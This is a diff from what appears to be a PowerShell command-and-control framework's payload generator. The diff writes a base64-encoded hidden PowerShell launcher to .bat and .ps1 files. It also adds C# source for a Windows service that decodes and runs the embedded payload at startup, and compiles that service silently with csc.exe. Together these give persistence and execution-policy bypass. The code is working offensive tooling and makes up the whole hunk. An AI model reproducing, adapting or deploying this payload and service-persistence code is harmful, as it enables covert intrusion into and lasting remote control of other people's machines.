@@ -385,13 +385,87 @@ if ($primer) {$primer| iex} else {
 start-sleep 10
 primer | iex
 }'
-        $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
-        $payloadraw = 'powershell -exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
-        $payload = $payloadraw -replace "`n", ""
-        [IO.File]::WriteAllLines("$FolderPath\payloads\proxypayload.bat", $payload)
-        [IO.File]::WriteAllLines("$PoshPath\Modules\proxypayload.ps1", "`$proxypayload = '$payload'")
-        Write-Host -Object "Payload written to: $FolderPath\payloads\proxypayload.bat"  -ForegroundColor Green
-        Write-Host -Object "Payload written to: $PoshPath\Modules\proxypayload.ps1"  -ForegroundColor Green
+    $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
+    $payloadraw = 'powershell -exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
+    $payload = $payloadraw -replace "`n", ""
+    [IO.File]::WriteAllLines("$FolderPath\payloads\proxypayload.bat", $payload)
+    [IO.File]::WriteAllLines("$PoshPath\Modules\proxypayload.ps1", "`$proxypayload = '$payload'")
+    Write-Host -Object "Payload written to: $FolderPath\payloads\proxypayload.bat"  -ForegroundColor Green
+    Write-Host -Object "Payload written to: $PoshPath\Modules\proxypayload.ps1"  -ForegroundColor Green
+
+    $praw = [Convert]::ToBase64String($bytes)
+    $cscservicecode = 'using System;
+    using System.Text;
+    using System.ServiceProcess;
+    using System.Collections.ObjectModel;
+    using System.Management.Automation;
+    using System.Management.Automation.Runspaces;
+
+
+    namespace Service
+    {
+        static class Program
+        {
+            static void Main()
+            {
+                ServiceBase[] ServicesToRun;
+                ServicesToRun = new ServiceBase[]
+                {
+                    new Service1()
+                };
+                ServiceBase.Run(ServicesToRun);
+            }
+        }
+        public partial class Service1 : ServiceBase
+        {
+            public static string InvokeAutomation(string cmd)
+            {
+                Runspace newrunspace = RunspaceFactory.CreateRunspace();
+                newrunspace.Open();
+                RunspaceInvoke scriptInvoker = new RunspaceInvoke(newrunspace);
+                Pipeline pipeline = newrunspace.CreatePipeline();
+
+                pipeline.Commands.AddScript(cmd);
+                Collection<PSObject> results = pipeline.Invoke();
+                newrunspace.Close();
+
+                StringBuilder stringBuilder = new StringBuilder();
+                foreach (PSObject obj in results)
+                {
+                    stringBuilder.Append(obj);
+                }
+                return stringBuilder.ToString().Trim();
+            }
+
+            protected override void OnStart(string[] args)
+            {
+                try
+                {
+                    string tt = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String("'+$praw+'"));
+                    InvokeAutomation(tt);
+                }
+                catch (ArgumentException e)
+                {
+                    string tt = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String("'+$praw+'"));
+                    InvokeAutomation(tt);
+                }
+            }
+
+            protected override void OnStop()
+            {
+            }
+        }
+    }'
+    [IO.File]::WriteAllLines("$FolderPath\payloads\posh-proxy-service.cs", $cscservicecode)
+
+    if (Test-Path "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe") {
+        Start-Process -WindowStyle hidden -FilePath "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" -ArgumentList "/out:$FolderPath\payloads\posh-proxy-service.exe $FolderPath\payloads\posh-proxy-service.cs /reference:$PoshPath\System.Management.Automation.dll"
+    } else {
+        if (Test-Path "C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe") {
+            Start-Process -WindowStyle hidden -FilePath "C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe" -ArgumentList "/out:$FolderPath\payloads\posh-proxy-service.exe $FolderPath\payloads\posh-proxy-service.cs /reference:$PoshPath\System.Management.Automation.dll"
+        }
+    }
+    Write-Host -Object "Payload written to: $FolderPath\payloads\posh-proxy-service.exe"  -ForegroundColor Green
     }
 function Invoke-DaisyChain {
 param($port, $daisyserver, $c2server, $c2port, $domfront, $proxyurl, $proxyuser, $proxypassword)
